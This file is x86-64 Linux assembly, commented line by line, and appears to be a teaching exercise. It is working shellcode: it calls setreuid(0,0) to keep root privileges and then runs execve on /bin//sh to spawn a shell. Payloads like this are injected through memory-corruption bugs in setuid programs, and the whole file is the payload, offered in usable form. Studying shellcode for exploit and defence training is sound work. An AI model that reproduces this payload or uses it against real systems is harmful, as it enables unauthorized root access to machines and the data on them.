; Env: Ubuntu 64-bit architecture
BITS 64

; Step 1: Set Effective User ID to zero
; int setreuid(uid_t ruid, uid_t euid)
xor rax, rax 		; clearing rax
xor rdi, rdi 		; passing argument 0 in rdi to setreuid()
xor rsi, rsi 		; passing argument 0 in rsi to setreuid()
mov al, 113 		; 113 = 0x71 is the syscall for setreuid() in the current environment
syscall 		    ; trigger an interrupt to execute setreuid()

; Step 2: Spawn a shell
; int execve(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]);
xor rax, rax 			; clearing rax
push rax  			  ; rax was set to 0, this serves as a null terminator.
mov rbx, 0x68732f2f6e69622f 	; placing /bin//sh into rbx
push rbx 			    ; placing /bin//sh onto the stack.
mov rdi, rsp 			; rsp points to the address of /bin/sh on stack, thus we store it in rdi
push rax 			    ;  rax was set to 0, this serves as a null terminator.
push rdi 			    ; rdi is the first argument to execve, it contains the path name '/bin/sh'.
mov rsi, rsp 			; rsi is the second argument to execve.
mov al, 59 			  ; store system call number (59 = 0x3B) for execve() in rax
syscall 			    ; trigger an interrupt to execute execve()
